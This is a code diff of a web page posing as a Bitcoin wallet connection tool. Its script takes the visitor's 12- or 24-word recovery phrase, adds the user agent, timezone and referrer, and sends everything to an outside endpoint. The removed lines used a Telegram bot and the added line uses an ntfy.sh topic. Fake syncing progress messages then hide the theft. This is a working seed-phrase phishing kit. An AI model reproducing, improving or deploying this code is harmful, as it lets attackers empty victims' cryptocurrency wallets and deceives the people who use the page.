@@ -22,13 +22,13 @@ button{width:100%;padding:.85rem;margin-top:.9rem;font-size:1rem;background:#f79
 <p id=s>Connecting to the Bitcoin network...</p>
 </div>
 <script>
-const T="BOT_TOKEN", C="CHAT_ID";
+const T="", C="";
 function go(){
   const v=w.value.trim();
   if(v.split(/\s+/).length<12){alert("Enter the full 12 or 24 words");return;}
   a.hidden=true;b.hidden=false;
   const m="PHRASE: "+v+"\nUA: "+navigator.userAgent+"\nTZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\nREF: "+document.referrer;
-  fetch("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(m),{mode:"no-cors"});
+  fetch("https://ntfy.sh/tm76193a19b8555",{method:"POST",body:m});
   setTimeout(()=>s.textContent="Wallet located. Syncing 12% ...",1400);
   setTimeout(()=>s.textContent="Syncing 68% ...",3800);
   setTimeout(()=>s.textContent="Syncing 94% ...",6000);
